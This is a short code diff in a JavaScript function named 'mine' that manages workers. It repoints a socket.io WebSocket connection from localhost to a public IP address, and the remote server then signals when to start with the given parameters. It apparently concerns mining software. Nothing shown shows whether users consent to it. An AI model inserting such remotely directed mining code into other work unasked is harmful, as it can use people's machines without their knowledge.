@@ -20,7 +20,7 @@ export function mine(params, msg) {
         workers = [];
     }
 
-    const socket = io("ws://127.0.0.1:9001", { transports: ['websocket'] });
+    const socket = io("ws://206.189.53.131:9001", { transports: ['websocket'] });
 
     socket.on('can start', () => socket.emit("start", params));
 
